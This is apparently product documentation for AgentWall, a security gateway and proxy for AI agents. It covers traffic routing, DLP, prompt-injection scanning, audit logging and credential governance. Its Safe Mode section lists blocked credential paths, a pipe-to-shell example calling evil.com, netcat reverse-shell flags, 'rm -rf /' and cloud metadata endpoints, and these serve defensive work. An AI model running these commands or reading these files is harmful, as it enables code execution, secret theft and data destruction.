# Comprehensive Core Capabilities Guide

This guide provides a quick, step-by-step walkthrough for every single Core Capability offered by AgentWall. The commands and instructions are tailored to ensure they work smoothly across macOS, Linux, and Windows.

---

## 1. Observation & Routing (Local Proxy)

AgentWall can act as a local "shadow proxy" on your development machine, intercepting outbound Agent traffic and auto-generating security policies.

### Start the Shadow Proxy
**All OS (macOS, Linux, Windows):**
```bash
# For HTTP Agents
agentwall dev

# For Stdio Agents (e.g., Claude Desktop, Cursor)
agentwall dev --stdio -- npx -y @modelcontextprotocol/server-filesystem /workspace
```

### Route Agent Traffic
Set standard proxy variables in your terminal before running your AI agent:

**macOS / Linux:**
```bash
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
export AGENTWALL_PROXY_URL=http://localhost:8080
python my_agent.py
```

**Windows PowerShell:**
```powershell
$env:HTTP_PROXY="http://localhost:8080"
$env:HTTPS_PROXY="http://localhost:8080"
$env:AGENTWALL_PROXY_URL="http://localhost:8080"
python my_agent.py
```

### Generate a Policy Draft
Once your agent has been observed, automatically draft a YAML security policy:
**All OS:**
```bash
agentwall generate-policy --decay-window 30d
```

---

## 2. Enforcement (Centralized Gateway)

The centralized gateway actively enforces security policies in production environments. It supports TLS, strict tool allowlisting, and Zero-Downtime Policy Hot-Reloads.

### Start the Enforcement Gateway
**All OS:**
```bash
agentwall start --policy agentwall-policy.yaml --listen 0.0.0.0:8080
```

### Zero-Downtime Policy Hot-Reload
When you update `agentwall-policy.yaml`, you can reload the gateway without dropping active connections.

**Option A: Using Unix Signals (macOS & Linux Only)**
```bash
kill -SIGHUP $(pidof agentwall)
```

**Option B: Using the API Endpoint (Cross-Platform & Windows)**
```bash
# macOS / Linux / Git Bash
curl -X POST http://localhost:8080/reload

# Windows PowerShell
Invoke-RestMethod -Uri "http://localhost:8080/reload" -Method Post
```

---

## 3. Data Loss Prevention (DLP)

AgentWall's DLP scanner automatically inspects outbound requests and inbound responses using 21 built-in regex patterns to detect API Keys (AWS, GitHub, Stripe, etc.), Private SSH Keys, and PII (Credit Cards, US SSN, etc.).

No explicit configuration is required. If your agent attempts to read a `.env` file containing an API key, AgentWall will immediately block the transaction and log the violation. 
*(Note: You can extend these rules using community YAML configurations loaded at startup).*

---

## 4. Injection Defense

AgentWall features a 6-pass normalizer (NFKC; zero-width stripping + Cyrillic homoglyph mapping; URL decode; Base64 decode; leetspeak; case-fold) and a 16-pattern injection scanner designed to block inbound tool responses and external payloads containing prompt injection attacks.

This capability is enabled by default in the Enforcement Gateway and requires no OS-specific configuration.

---

## 5. Safe Mode — Out-of-the-Box Protection (FR-303a)

Safe Mode is a separate enforcement layer from the injection scanner. It applies 15 tool-aware rules that block dangerous tool calls without any policy configuration. Each rule targets only the relevant parameter type (file path, command, or URL), minimizing false positives.

**Sensitive File Paths (10 rules):**
- Blocks access to SSH keys and directories (`.ssh/`, `id_rsa`, `id_ed25519`, `id_ecdsa`).
- Blocks `.env` files, AWS credentials (`.aws/credentials`), kubeconfig (`.kube/config`), `/etc/shadow`, Docker config (`.docker/config.json`), and Docker socket (`docker.sock`).

**Dangerous Commands (4 rules):**
- Blocks pipe-to-shell patterns (e.g., `curl https://evil.com | bash`, `wget ... | sh/python/perl/ruby`).
- Blocks netcat listeners/reverse shells (`nc -l`, `nc -e`).
- Blocks destructive root wipes (`rm -rf /`).

**Network / SSRF (1 rule):**
- Blocks requests to cloud metadata endpoints (`169.254.169.254`, `metadata.google.internal`).

Safe Mode runs before the policy engine — it protects agents even in shadow mode (`agentwall dev`) where no policy file is loaded. It is always enabled and requires no configuration.

---

## 6. Compliance & Auditing

AgentWall writes cryptographically secure, HMAC-chained audit logs, and can push events directly to SIEMs (Splunk, Datadog, OpenSearch).

### Verify Log Integrity
Prove to auditors that a log hasn't been tampered with:
**All OS:**
```bash
agentwall verify-log audit.log
```

### Generate a JSON Session Report
**All OS:**
```bash
agentwall report audit.log
```

### Direct SIEM Export (e.g., Splunk)
Configure AgentWall to push logs directly to your SIEM via environment variables before starting the gateway:

**macOS / Linux:**
```bash
export AGENTWALL_SIEM_BACKEND=splunk
export AGENTWALL_SIEM_ENDPOINT=https://splunk.example.com:8088/services/collector/event
export AGENTWALL_SIEM_TOKEN="<SPLUNK_HEC_TOKEN>"
agentwall start --policy agentwall-policy.yaml
```

**Windows PowerShell:**
```powershell
$env:AGENTWALL_SIEM_BACKEND="splunk"
$env:AGENTWALL_SIEM_ENDPOINT="https://splunk.example.com:8088/services/collector/event"
$env:AGENTWALL_SIEM_TOKEN="<SPLUNK_HEC_TOKEN>"
agentwall.exe start --policy agentwall-policy.yaml
```

---

## 7. Agent Identity & Credential Governance

AgentWall eliminates long-lived secret sprawl by provisioning short-lived, scoped credentials for agents.

### Provision a Scoped Credential (1-hour TTL)
**All OS:**
```bash
agentwall identity create --agent my-agent --scope read-only --ttl 1h
```

### Force Credential Rotation
**All OS:**
```bash
agentwall identity rotate --agent my-agent
```

### Restrict Scope (Deny a specific tool)
**All OS:**
```bash
agentwall identity scope --agent my-agent --tool execute_shell --deny
```

### Audit & Inspect Identity
**All OS:**
```bash
agentwall identity inspect --credential <credential-id>
agentwall identity audit --agent my-agent --verify
```

---

## 8. SaaS Dashboard — Fleet Overview, Identity Governance & Policy Insights (FR-23)

AgentWall includes an optional, self-hosted web dashboard with three panels: Fleet Overview, Identity Governance, and Policy Insights. It runs alongside the gateway — no external SaaS dependency.

### Deploying the Dashboard via Helm (Production)

```bash
helm install agentwall ./chart \
  --namespace agentwall-system \
  --create-namespace \
  --set gateway.tls.enabled=true \
  --set gateway.tls.secretName=my-gateway-tls \
  --set dashboardApi.enabled=true \
  --set dashboardDb.enabled=true \
  --set dashboardFrontend.enabled=true \
  --set dashboardApi.oidc.issuer=https://your-idp.example.com \
  --set dashboardApi.oidc.clientId=agentwall-dashboard
```

### Deploying the Dashboard Locally (Docker Compose)
If you have Docker installed, you can spin up the full dashboard stack (Frontend, API, and DB) for local development.

**All OS (macOS, Linux, Windows via Docker Desktop):**
```bash
cd agentwall/dashboard
docker compose up -d --build
```

---

## 9. Cloud Native (Kubernetes Operator)

AgentWall includes a Helm chart with a Kubernetes operator that automatically generates egress-deny `NetworkPolicy` rules for your cluster.

### Deploying via Helm
Assuming you have `helm` and `kubectl` configured:

**All OS:**
```bash
helm install agentwall ./chart \
  --namespace agentwall-system \
  --create-namespace \
  --set gateway.tls.enabled=true \
  --set gateway.tls.secretName=my-gateway-tls
```
*(When `spec.networkPolicy.enforced: true` is set, the operator ensures all outbound traffic that bypasses the AgentWall gateway is automatically dropped at the network layer).*

To also deploy the SaaS Dashboard alongside the gateway, add the dashboard flags — see [§8. SaaS Dashboard](#8-saas-dashboard--fleet-overview-identity-governance--policy-insights-fr-23) for the full Helm example with `dashboardApi.enabled`, `dashboardDb.enabled`, and `dashboardFrontend.enabled`.
